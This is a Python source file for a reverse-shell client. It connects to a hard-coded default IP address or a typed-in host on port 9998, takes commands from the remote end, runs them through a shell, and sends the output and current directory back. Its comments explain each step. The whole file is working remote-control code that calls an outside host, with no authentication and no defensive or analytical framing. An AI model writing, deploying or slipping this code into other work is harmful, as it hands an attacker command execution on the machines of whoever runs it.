import os
import socket
import subprocess

host = '35.20.2.6'
hst = input("Type in the ip address of the host: ")
if len(hst) > 1:
    host = hst

port = 9998
s = socket.socket()
s.connect((host, port))

while True:
    data = s.recv(1024)
    # checks if the first chars of a command is 'cd'
    if data[:2].decode("utf-8") == 'cd':
        # then passes the argument to the os
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        # makes a new process and runs a command and pipes the results/ output to stdin, stderr and stdin
        # if we say shell = False then a shell will not pop up on client's screen
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        # store results as bytes
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        #store results as a string
        output_str = str(output_bytes, "utf-8")
        # send results, and current working directory
        s.send(str.encode(output_str + str(os.getcwd()) + ":~"))
        # prints the results to the client, optional
        print(output_str)

